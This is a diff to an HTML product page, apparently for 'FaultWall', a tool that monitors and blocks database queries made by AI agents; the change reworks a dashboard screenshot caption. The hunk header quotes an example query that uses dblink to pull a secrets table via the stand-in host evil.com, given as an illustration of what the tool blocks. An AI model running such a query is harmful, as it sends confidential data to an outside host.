@@ -286,7 +286,7 @@ SELECT * FROM dblink('host=evil.com', 'SELECT * FROM secrets');</code></pre>
     </div>
     <div class="screenshot">
       <img src="dashboard-2.jpg" alt="FaultWall dashboard: policy violations, violations per agent chart, connected agents" style="width:100%; height:auto;" loading="lazy">
-      <div class="caption">FaultWall dashboard showing enforcement mode, blocked violations, and agent activity tracking.</div>
+      <div class="caption">Sample dashboard from a test run with 3 agents (cursor-ai, demo-agent, rogue-agent) — showing enforcement mode, 8 blocked violations, and agent activity tracking.</div>
     </div>
 
     <p>Two modes: <strong>monitor</strong> logs everything without blocking (so you can see what your agents actually do before you start killing queries) and <strong>enforce</strong> terminates violating connections via <code>pg_terminate_backend()</code>.</p>
